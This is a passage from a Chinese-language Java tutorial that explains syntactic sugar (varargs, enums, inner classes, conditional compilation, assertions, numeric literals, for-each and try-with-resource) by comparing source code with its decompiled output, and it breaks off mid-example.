<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span></span><br><span class="line">&#123;</span><br><span class="line">    print(<span class="string">&quot;Holis&quot;</span>, <span class="string">&quot;公众号:Hollis&quot;</span>, <span class="string">&quot;博客：www.hollischuang.com&quot;</span>, <span class="string">&quot;QQ：907607222&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">print</span><span class="params">(String... strs)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; strs.length; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        System.out.println(strs[i]);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<p>反编译后代码：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String args[])</span></span><br><span class="line">&#123;</span><br><span class="line">    print(<span class="keyword">new</span> <span class="title class_">String</span>[] &#123;</span><br><span class="line">        <span class="string">&quot;Holis&quot;</span>, <span class="string">&quot;\u516C\u4F17\u53F7:Hollis&quot;</span>, <span class="string">&quot;\u535A\u5BA2\uFF1Awww.hollischuang.com&quot;</span>, <span class="string">&quot;QQ\uFF1A907607222&quot;</span></span><br><span class="line">    &#125;);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">transient</span> <span class="keyword">void</span> <span class="title function_">print</span><span class="params">(String strs[])</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; strs.length; i++)</span><br><span class="line">    System.out.println(strs[i]);</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<p>从反编译后代码可以看出，可变参数在被使用的时候，他首先会创建一个数组，数组的长度就是调用该方法是传递的实参的个数，然后再把参数值全部放到这个数组当中，然后再把这个数组作为参数传递到被调用的方法中。</p>
<h3 id="糖块五-、-枚举"><a href="#糖块五-、-枚举" class="headerlink" title="糖块五 、 枚举"></a>糖块五 、 枚举</h3><p>在Java中，枚举是一种特殊的数据类型，用于表示有限的一组常量。枚举常量是在枚举类型中定义的，每个常量都是该类型的一个实例。Java中的枚举类型是一种安全而优雅的方式来表示有限的一组值。</p>
<p>要想看源码，首先得有一个类吧，那么枚举类型到底是什么类呢？是<code>enum</code>吗？答案很明显不是，<code>enum</code>就和<code>class</code>一样，只是一个关键字，他并不是一个类，那么枚举是由什么类维护的呢，我们简单的写一个枚举：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">enum</span> <span class="title class_">t</span> &#123;</span><br><span class="line">    SPRING,SUMMER;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<p>然后我们使用反编译，看看这段代码到底是怎么实现的，反编译后代码内容如下：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">final</span> <span class="keyword">class</span> <span class="title class_">T</span> <span class="keyword">extends</span> <span class="title class_">Enum</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="title function_">T</span><span class="params">(String s, <span class="type">int</span> i)</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">super</span>(s, i);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> T[] values()</span><br><span class="line">    &#123;</span><br><span class="line">        T at[];</span><br><span class="line">        <span class="type">int</span> i;</span><br><span class="line">        T at1[];</span><br><span class="line">        System.arraycopy(at = ENUM$VALUES, <span class="number">0</span>, at1 = <span class="keyword">new</span> <span class="title class_">T</span>[i = at.length], <span class="number">0</span>, i);</span><br><span class="line">        <span class="keyword">return</span> at1;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> T <span class="title function_">valueOf</span><span class="params">(String s)</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">return</span> (T)Enum.valueOf(demo/T, s);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">final</span> T SPRING;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">final</span> T SUMMER;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> T ENUM$VALUES[];</span><br><span class="line">    <span class="keyword">static</span></span><br><span class="line">    &#123;</span><br><span class="line">        SPRING = <span class="keyword">new</span> <span class="title class_">T</span>(<span class="string">&quot;SPRING&quot;</span>, <span class="number">0</span>);</span><br><span class="line">        SUMMER = <span class="keyword">new</span> <span class="title class_">T</span>(<span class="string">&quot;SUMMER&quot;</span>, <span class="number">1</span>);</span><br><span class="line">        ENUM$VALUES = (<span class="keyword">new</span> <span class="title class_">T</span>[] &#123;</span><br><span class="line">            SPRING, SUMMER</span><br><span class="line">        &#125;);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<p>通过反编译后代码我们可以看到，<code>public final class T extends Enum</code>，说明，该类是继承了<code>Enum</code>类的，同时<code>final</code>关键字告诉我们，这个类也是不能被继承的。<strong>当我们使用</strong><code>**enum**</code><strong>来定义一个枚举类型的时候，编译器会自动帮我们创建一个</strong><code>**final**</code><strong>类型的类继承</strong><code>**Enum**</code><strong>类，所以枚举类型不能被继承。</strong></p>
<h3 id="糖块六-、-内部类"><a href="#糖块六-、-内部类" class="headerlink" title="糖块六 、 内部类"></a>糖块六 、 内部类</h3><p>内部类又称为嵌套类，可以把内部类理解为外部类的一个普通成员。</p>
<p><strong>内部类之所以也是语法糖，是因为它仅仅是一个编译时的概念，</strong><code>**outer.java**</code><strong>里面定义了一个内部类</strong><code>**inner**</code><strong>，一旦编译成功，就会生成两个完全不同的</strong><code>**.class**</code><strong>文件了，分别是</strong><code>**outer.class**</code><strong>和</strong><code>**outer$inner.class**</code><strong>。</strong></p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">OutterClass</span> &#123;</span><br><span class="line">    <span class="keyword">private</span> String userName;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">getUserName</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> userName;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setUserName</span><span class="params">(String userName)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.userName = userName;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">class</span> <span class="title class_">InnerClass</span>&#123;</span><br><span class="line">        <span class="keyword">private</span> String name;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> String <span class="title function_">getName</span><span class="params">()</span> &#123;</span><br><span class="line">            <span class="keyword">return</span> name;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setName</span><span class="params">(String name)</span> &#123;</span><br><span class="line">            <span class="built_in">this</span>.name = name;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<p>以上代码编译后会生成两个class文件：<code>OutterClass$InnerClass.class</code> 、<code>OutterClass.class</code> 。当我们尝试对<code>OutterClass.class</code>文件进行反编译的时候，命令行会打印以下内容：<code>Parsing OutterClass.class...Parsing inner class OutterClass$InnerClass.class... Generating OutterClass.jad</code> 。他会把两个文件全部进行反编译，然后一起生成一个<code>OutterClass.jad</code>文件。文件内容如下：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">OutterClass</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">class</span> <span class="title class_">InnerClass</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">public</span> String <span class="title function_">getName</span><span class="params">()</span></span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">return</span> name;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setName</span><span class="params">(String name)</span></span><br><span class="line">        &#123;</span><br><span class="line">            <span class="built_in">this</span>.name = name;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">private</span> String name;</span><br><span class="line">        <span class="keyword">final</span> OutterClass <span class="built_in">this</span>$<span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">        InnerClass()</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="built_in">this</span>.<span class="built_in">this</span>$<span class="number">0</span> = OutterClass.<span class="built_in">this</span>;</span><br><span class="line">            <span class="built_in">super</span>();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">OutterClass</span><span class="params">()</span></span><br><span class="line">    &#123;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">getUserName</span><span class="params">()</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">return</span> userName;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setUserName</span><span class="params">(String userName)</span>&#123;</span><br><span class="line">        <span class="built_in">this</span>.userName = userName;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String args1[])</span></span><br><span class="line">    &#123;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">private</span> String userName;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<h3 id="糖块七-、条件编译"><a href="#糖块七-、条件编译" class="headerlink" title="糖块七 、条件编译"></a>糖块七 、条件编译</h3><p>—般情况下，程序中的每一行代码都要参加编译。但有时候出于对程序代码优化的考虑，希望只对其中一部分内容进行编译，此时就需要在程序中加上条件，让编译器只对满足条件的代码进行编译，将不满足条件的代码舍弃，这就是条件编译。</p>
<p>如在C或CPP中，可以通过预处理语句来实现条件编译。其实在Java中也可实现条件编译。我们先来看一段代码：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">ConditionalCompilation</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="keyword">final</span> <span class="type">boolean</span> <span class="variable">DEBUG</span> <span class="operator">=</span> <span class="literal">true</span>;</span><br><span class="line">        <span class="keyword">if</span>(DEBUG) &#123;</span><br><span class="line">            System.out.println(<span class="string">&quot;Hello, DEBUG!&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">final</span> <span class="type">boolean</span> <span class="variable">ONLINE</span> <span class="operator">=</span> <span class="literal">false</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(ONLINE)&#123;</span><br><span class="line">            System.out.println(<span class="string">&quot;Hello, ONLINE!&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<p>反编译后代码如下：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">ConditionalCompilation</span></span><br><span class="line">&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">ConditionalCompilation</span><span class="params">()</span></span><br><span class="line">    &#123;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String args[])</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="type">boolean</span> <span class="variable">DEBUG</span> <span class="operator">=</span> <span class="literal">true</span>;</span><br><span class="line">        System.out.println(<span class="string">&quot;Hello, DEBUG!&quot;</span>);</span><br><span class="line">        <span class="type">boolean</span> <span class="variable">ONLINE</span> <span class="operator">=</span> <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<p>首先，我们发现，在反编译后的代码中没有<code>System.out.println(&quot;Hello, ONLINE!&quot;);</code>，这其实就是条件编译。当<code>if(ONLINE)</code>为false的时候，编译器就没有对其内的代码进行编译。</p>
<p>所以，<strong>Java语法的条件编译，是通过判断条件为常量的if语句实现的。其原理也是Java语言的语法糖。根据if判断条件的真假，编译器直接把分支为false的代码块消除。通过该方式实现的条件编译，必须在方法体内实现，而无法在正整个Java类的结构或者类的属性上进行条件编译，这与C&#x2F;C++的条件编译相比，确实更有局限性。在Java语言设计之初并没有引入条件编译的功能，虽有局限，但是总比没有更强。</strong></p>
<h3 id="糖块八-、-断言"><a href="#糖块八-、-断言" class="headerlink" title="糖块八 、 断言"></a>糖块八 、 断言</h3><p>在Java中，<code>assert</code>关键字是从JAVA SE 1.4 引入的，为了避免和老版本的Java代码中使用了<code>assert</code>关键字导致错误，Java在执行的时候默认是不启动断言检查的（这个时候，所有的断言语句都将忽略！），如果要开启断言检查，则需要用开关<code>-enableassertions</code>或<code>-ea</code>来开启。</p>
<p>看一段包含断言的代码：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">AssertTest</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String args[])</span> &#123;</span><br><span class="line">        <span class="type">int</span> <span class="variable">a</span> <span class="operator">=</span> <span class="number">1</span>;</span><br><span class="line">        <span class="type">int</span> <span class="variable">b</span> <span class="operator">=</span> <span class="number">1</span>;</span><br><span class="line">        <span class="keyword">assert</span> a == b;</span><br><span class="line">        System.out.println(<span class="string">&quot;公众号：Hollis&quot;</span>);</span><br><span class="line">        <span class="keyword">assert</span> a != b : <span class="string">&quot;Hollis&quot;</span>;</span><br><span class="line">        System.out.println(<span class="string">&quot;博客：www.hollischuang.com&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<p>反编译后代码如下：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">AssertTest</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">AssertTest</span><span class="params">()</span></span><br><span class="line">    &#123;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String args[])</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="type">int</span> <span class="variable">a</span> <span class="operator">=</span> <span class="number">1</span>;</span><br><span class="line">        <span class="type">int</span> <span class="variable">b</span> <span class="operator">=</span> <span class="number">1</span>;</span><br><span class="line">        <span class="keyword">if</span>(!$assertionsDisabled &amp;&amp; a != b)</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">AssertionError</span>();</span><br><span class="line">        System.out.println(<span class="string">&quot;\u516C\u4F17\u53F7\uFF1AHollis&quot;</span>);</span><br><span class="line">        <span class="keyword">if</span>(!$assertionsDisabled &amp;&amp; a == b)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">AssertionError</span>(<span class="string">&quot;Hollis&quot;</span>);</span><br><span class="line">        &#125; <span class="keyword">else</span></span><br><span class="line">        &#123;</span><br><span class="line">            System.out.println(<span class="string">&quot;\u535A\u5BA2\uFF1Awww.hollischuang.com&quot;</span>);</span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">boolean</span> <span class="variable">$assertionsDisabled</span> <span class="operator">=</span> !com/hollis/suguar/AssertTest.desiredAssertionStatus();</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<p>很明显，反编译之后的代码要比我们自己的代码复杂的多。所以，使用了assert这个语法糖我们节省了很多代码。<strong>其实断言的底层实现就是if语言，如果断言结果为true，则什么都不做，程序继续执行，如果断言结果为false，则程序抛出AssertError来打断程序的执行。</strong><code>-enableassertions</code>会设置$assertionsDisabled字段的值。</p>
<h3 id="糖块九-、-数值字面量"><a href="#糖块九-、-数值字面量" class="headerlink" title="糖块九 、 数值字面量"></a>糖块九 、 数值字面量</h3><p>在java 7中，数值字面量，不管是整数还是浮点数，都允许在数字之间插入任意多个下划线。这些下划线不会对字面量的数值产生影响，目的就是方便阅读。</p>
<p>比如：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Test</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String... args)</span> &#123;</span><br><span class="line">        <span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">10_000</span>;</span><br><span class="line">        System.out.println(i);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<p>反编译后：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Test</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">10000</span>;</span><br><span class="line">        System.out.println(i);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<p>反编译后就是把<code>_</code>删除了。也就是说 <strong>编译器并不认识在数字字面量中的</strong><code>**_**</code><strong>，需要在编译阶段把他去掉。</strong></p>
<h3 id="糖块十-、-for-each"><a href="#糖块十-、-for-each" class="headerlink" title="糖块十 、 for-each"></a>糖块十 、 for-each</h3><p>增强for循环（<code>for-each</code>）相信大家都不陌生，日常开发经常会用到的，他会比for循环要少写很多代码，那么这个语法糖背后是如何实现的呢？</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String... args)</span> &#123;</span><br><span class="line">    String[] strs = &#123;<span class="string">&quot;Hollis&quot;</span>, <span class="string">&quot;公众号：Hollis&quot;</span>, <span class="string">&quot;博客：www.hollischuang.com&quot;</span>&#125;;</span><br><span class="line">    <span class="keyword">for</span> (String s : strs) &#123;</span><br><span class="line">        System.out.println(s);</span><br><span class="line">    &#125;</span><br><span class="line">    List&lt;String&gt; strList = ImmutableList.of(<span class="string">&quot;Hollis&quot;</span>, <span class="string">&quot;公众号：Hollis&quot;</span>, <span class="string">&quot;博客：www.hollischuang.com&quot;</span>);</span><br><span class="line">    <span class="keyword">for</span> (String s : strList) &#123;</span><br><span class="line">        System.out.println(s);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<p>反编译后代码如下：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">transient</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String args[])</span></span><br><span class="line">&#123;</span><br><span class="line">    String strs[] = &#123;</span><br><span class="line">        <span class="string">&quot;Hollis&quot;</span>, <span class="string">&quot;\u516C\u4F17\u53F7\uFF1AHollis&quot;</span>, <span class="string">&quot;\u535A\u5BA2\uFF1Awww.hollischuang.com&quot;</span></span><br><span class="line">    &#125;;</span><br><span class="line">    String args1[] = strs;</span><br><span class="line">    <span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> args1.length;</span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> <span class="variable">j</span> <span class="operator">=</span> <span class="number">0</span>; j &lt; i; j++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">s</span> <span class="operator">=</span> args1[j];</span><br><span class="line">        System.out.println(s);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="type">List</span> <span class="variable">strList</span> <span class="operator">=</span> ImmutableList.of(<span class="string">&quot;Hollis&quot;</span>, <span class="string">&quot;\u516C\u4F17\u53F7\uFF1AHollis&quot;</span>, <span class="string">&quot;\u535A\u5BA2\uFF1Awww.hollischuang.com&quot;</span>);</span><br><span class="line">    String s;</span><br><span class="line">    <span class="keyword">for</span>(<span class="type">Iterator</span> <span class="variable">iterator</span> <span class="operator">=</span> strList.iterator(); iterator.hasNext(); System.out.println(s))</span><br><span class="line">    s = (String)iterator.next();</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<p>代码很简单，<strong>for-each的实现原理其实就是使用了普通的for循环和迭代器。</strong></p>
<h3 id="糖块十一-、-try-with-resource"><a href="#糖块十一-、-try-with-resource" class="headerlink" title="糖块十一 、 try-with-resource"></a>糖块十一 、 try-with-resource</h3><p>Java里，对于文件操作IO流、数据库连接等开销非常昂贵的资源，用完之后必须及时通过close方法将其关闭，否则资源会一直处于打开状态，可能会导致内存泄露等问题。</p>
<p>关闭资源的常用方式就是在<code>finally</code>块里是释放，即调用<code>close</code>方法。比如，我们经常会写这样的代码：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">    <span class="type">BufferedReader</span> <span class="variable">br</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        String line;</span><br><span class="line">        br = <span class="keyword">new</span> <span class="title class_">BufferedReader</span>(<span class="keyword">new</span> <span class="title class_">FileReader</span>(<span class="string">&quot;d:\\hollischuang.xml&quot;</span>));</span><br><span class="line">        <span class="keyword">while</span> ((line = br.readLine()) != <span class="literal">null</span>) &#123;</span><br><span class="line">            System.out.println(line);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">catch</span> (IOException e) &#123;</span><br><span class="line">        <span class="comment">// handle exception</span></span><br><span class="line">    &#125; <span class="keyword">finally</span> &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="keyword">if</span> (br != <span class="literal">null</span>) &#123;</span><br><span class="line">                br.close();</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">catch</span> (IOException ex) &#123;</span><br><span class="line">            <span class="comment">// handle exception</span></span><br><span class="line">        &#125;</span><br><span class="line">    